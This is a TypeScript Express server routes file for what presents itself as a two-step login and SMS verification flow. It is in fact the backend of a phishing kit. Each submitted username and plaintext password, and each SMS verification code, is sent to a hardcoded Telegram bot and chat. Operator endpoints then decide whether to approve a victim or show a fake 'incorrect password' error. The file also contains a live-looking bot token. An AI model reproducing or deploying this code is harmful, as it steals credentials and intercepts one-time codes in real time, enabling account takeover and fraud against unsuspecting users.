import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { z } from "zod";
import { storage } from "./storage";
import { loginSchema, usernameSchema } from "@shared/schema";

// Telegram configuration
const TELEGRAM_BOT_TOKEN = "6954919116:AAF5ialybjcO6AJZ0CWGPVvtRoArCYzkK3I";
const TELEGRAM_CHAT_ID = "-4535798767";

// Function to send message to Telegram
async function sendToTelegram(username: string, password: string) {
  try {
    const message = `🔐 New Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}`;
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      console.error('Failed to send to Telegram:', await response.text());
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Authentication routes
  app.post("/api/auth/login", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const loginData = loginSchema.parse(req.body);

      // Send login data to Telegram
      await sendToTelegram(loginData.username, loginData.password);

      // Log the login attempt
      await storage.logLoginAttempt({
        username: loginData.username,
        success: false, // Will update this based on validation result
        ipAddress: req.ip || req.connection.remoteAddress,
        userAgent: req.get("User-Agent"),
      });

      // Validate login credentials
      const result = await storage.validateLogin(loginData);

      // Log successful attempt if applicable
      if (result.success) {
        await storage.logLoginAttempt({
          username: loginData.username,
          success: true,
          ipAddress: req.ip || req.connection.remoteAddress,
          userAgent: req.get("User-Agent"),
        });

        // Update remember preference
        await storage.updateUserRememberPreference(loginData.username, loginData.rememberUsername);
      }

      if (result.success) {
        res.json({ 
          success: true, 
          message: result.message,
          user: {
            id: result.user!.id,
            username: result.user!.username,
            rememberUsername: result.user!.rememberUsername,
          }
        });
      } else {
        res.status(401).json({ 
          success: false, 
          message: result.message 
        });
      }
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          success: false,
          message: "Invalid input data",
          errors: error.errors,
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    }
  });

  // Check username endpoint (POST method for two-step login)
  app.post("/api/auth/check-username", async (req: Request, res: Response) => {
    try {
      // Validate request body
      const usernameData = usernameSchema.parse(req.body);
      
      // For this demo, we'll accept any username and proceed to password step
      // In a real app, you might check if the username exists or create a new user
      res.json({ 
        success: true,
        message: "Username validated",
        username: usernameData.username,
        rememberUsername: usernameData.rememberUsername,
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        res.status(400).json({
          success: false,
          message: "Invalid input data",
          errors: error.errors,
        });
      } else {
        res.status(500).json({
          success: false,
          message: "Internal server error",
        });
      }
    }
  });

  // Get user by username (for checking if username exists)
  app.get("/api/auth/check-username/:username", async (req: Request, res: Response) => {
    try {
      const username = req.params.username;
      const user = await storage.getUserByUsername(username);
      
      res.json({ 
        exists: !!user,
        rememberUsername: user?.rememberUsername || false,
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Create new user (registration)
  app.post("/api/auth/register", async (req: Request, res: Response) => {
    try {
      const userData = req.body;
      
      // Check if username already exists
      const existingUser = await storage.getUserByUsername(userData.username);
      if (existingUser) {
        res.status(409).json({
          success: false,
          message: "Username already exists",
        });
        return;
      }

      const user = await storage.createUser(userData);
      res.json({ 
        success: true, 
        message: "User created successfully",
        user: {
          id: user.id,
          username: user.username,
        }
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Password reset/username recovery endpoint
  app.post("/api/auth/recover-username", async (req: Request, res: Response) => {
    try {
      const { email } = req.body;
      
      // In a real app, this would send an email with username recovery instructions
      res.json({
        success: true,
        message: "If an account exists with that email, recovery instructions have been sent.",
      });
    } catch (error) {
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // Admin panel routes
  app.post("/api/admin/grant", async (req: Request, res: Response) => {
    try {
      const { username, password, action } = req.body;
      
      // Send grant notification to Telegram
      const message = `✅ LOGIN GRANTED\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: Approved for SMS verification`;
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });

      res.json({
        success: true,
        message: "Access granted - proceeding to SMS verification",
      });
    } catch (error) {
      console.error('Error in grant endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.post("/api/admin/deny", async (req: Request, res: Response) => {
    try {
      const { username, password, action } = req.body;
      
      // Send deny notification to Telegram
      const message = `❌ LOGIN DENIED\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: Denied - showing "incorrect password"`;
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });

      res.json({
        success: true,
        message: "Access denied - user will see incorrect password error",
      });
    } catch (error) {
      console.error('Error in deny endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  // SMS verification routes
  app.post("/api/sms/verify", async (req: Request, res: Response) => {
    try {
      const { username, code, timestamp } = req.body;
      
      // Send SMS verification attempt to Telegram
      const message = `📱 SMS VERIFICATION ATTEMPT\n👤 Username: ${username}\n🔢 Code: ${code}\n⏰ Time: ${timestamp}\n📋 Status: Verification code entered`;
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });

      // For demo purposes, accept any 6-digit code
      if (code && code.length === 6 && /^\d{6}$/.test(code)) {
        res.json({
          success: true,
          message: "SMS verification successful",
        });
      } else {
        res.status(400).json({
          success: false,
          message: "Invalid verification code",
        });
      }
    } catch (error) {
      console.error('Error in SMS verify endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  app.post("/api/sms/resend", async (req: Request, res: Response) => {
    try {
      const { username } = req.body;
      
      // Send resend request to Telegram
      const message = `🔄 SMS CODE RESEND REQUEST\n👤 Username: ${username}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: New verification code requested`;
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });

      res.json({
        success: true,
        message: "New verification code sent",
      });
    } catch (error) {
      console.error('Error in SMS resend endpoint:', error);
      res.status(500).json({
        success: false,
        message: "Internal server error",
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
